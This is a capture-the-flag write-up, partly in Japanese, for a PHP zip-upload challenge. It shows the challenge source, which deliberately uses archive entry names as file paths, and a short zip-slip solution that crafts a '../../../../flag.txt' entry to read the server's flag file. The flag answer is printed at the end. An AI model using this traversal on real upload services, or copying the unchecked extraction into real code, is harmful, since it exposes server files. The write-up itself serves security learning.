# unzip
188 pt (118 Solves)

```
Unzip Your .zip Archive Like a Pro.
[url]
```

<details>
  <summary>index.php</summary>
  
  ```php
  <?php
error_reporting(0);
session_start();

// prepare the session
$user_dir = "/uploads/" . session_id();
if (!file_exists($user_dir))
    mkdir($user_dir);

if (!isset($_SESSION["files"]))
    $_SESSION["files"] = array();

// return file if filename parameter is passed
if (isset($_GET["filename"]) && is_string(($_GET["filename"]))) {
    if (in_array($_GET["filename"], $_SESSION["files"], TRUE)) {
        $filepath = $user_dir . "/" . $_GET["filename"];
        header("Content-Type: text/plain");
        echo file_get_contents($filepath);
        die();
    } else {
        echo "no such file";
        die();
    }
}

// process uploaded files
$target_file = $target_dir . basename($_FILES["file"]["name"]);
if (isset($_FILES["file"])) {
    // size check of uploaded file
    if ($_FILES["file"]["size"] > 1000) {
        echo "the size of uploaded file exceeds 1000 bytes.";
        die();
    }

    // try to open uploaded file as zip
    $zip = new ZipArchive;
    if ($zip->open($_FILES["file"]["tmp_name"]) !== TRUE) {
        echo "failed to open your zip.";
        die();
    }


    // check the size of unzipped files
    $extracted_zip_size = 0;
    for ($i = 0; $i < $zip->numFiles; $i++)
        $extracted_zip_size += $zip->statIndex($i)["size"];

    if ($extracted_zip_size > 1000) {
        echo "the total size of extracted files exceeds 1000 bytes.";
        die();
    }

    // extract
    $zip->extractTo($user_dir);

    // add files to $_SESSION["files"]
    for ($i = 0; $i < $zip->numFiles; $i++) {
        $s = $zip->statIndex($i);
        if (!in_array($s["name"], $_SESSION["files"], TRUE)) {
            $_SESSION["files"][] = $s["name"];
        }
    }

    $zip->close();
}
?>

<!DOCTYPE html>
<html>

<head>
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">

    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title></title>
</head>

<body>
    <nav role="navigation">
        <div class="nav-wrapper container">
            <a id="logo-container" href="/" class="brand-logo">Unzip</a>
        </div>
    </nav>


    <div class="container">
        <br><br>
        <h1 class="header center teal-text text-lighten-2">Unzip</h1>
        <div class="row center">
            <h5 class="header col s12 light">
                Unzip Your .zip Archive Like a Pro
            </h5>
        </div>
    </div>
    </div>



    <div class="container">
        <div class="section">
            <h2>Upload</h2>
            <form method="post" enctype="multipart/form-data">
                <div class="file-field input-field">
                    <div class="btn">
                        <span>Select .zip to Upload</span>
                        <input type="file" name="file">
                    </div>
                    <div class="file-path-wrapper">
                        <input class="file-path validate" type="text">
                    </div>
                </div>
                <button class="btn waves-effect waves-light">
                    Submit
                    <i class="material-icons right">send</i>
                </button>
            </form>
        </div>
    </div>

    <div class="container">
        <div class="section">
            <h2>Files from Your Archive(s)</h2>
            <div class="collection">
                <?php foreach ($_SESSION["files"] as $filename) { ?>
                    <a href="/?filename=<?= urlencode($filename) ?>" class="collection-item"><?= htmlspecialchars($filename, ENT_QUOTES, "UTF-8") ?></a>
                <? } ?>
            </div>
        </div>
    </div>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
</body>

</html>
  ```
</details>

<details>
  <summary>docker-compose.yml</summary>
  
  ```yml
  version: "3"

services:
  nginx:
    build: ./docker/nginx
    ports:
      - "127.0.0.1:$APP_PORT:80"
    depends_on:
      - php-fpm
    volumes:
      - ./storage/logs/nginx:/var/log/nginx
      - ./public:/var/www/web
    environment:
      TZ: "Asia/Tokyo"
    restart: always

  php-fpm:
    build: ./docker/php-fpm
    env_file: .env
    working_dir: /var/www/web
    environment:
      TZ: "Asia/Tokyo"
    volumes:
      - ./public:/var/www/web
      - ./uploads:/uploads
      - ./flag.txt:/flag.txt
    restart: always
  ```
</details>

## 概要
zipファイルをアップロードしたら解凍してくれる。  
urlでディレクトリトラバーサル的な事ができそうだったけどできなかった。

## 解
zipslipやっていく。

```
$ touch flag.txt
$ mkdir -p dir/dir/dir/dir
$ cd dir/dir/dir/dir
$ zip zip-slip.zip ../../../../flag.txt
```

`zip-slip.zip`をアップロードして解凍させる。`../../../../flag.txt`を開けばflag。

```
ctf4b{y0u_c4nn07_7ru57_4ny_1npu75_1nclud1n6_z1p_f1l3n4m35}
```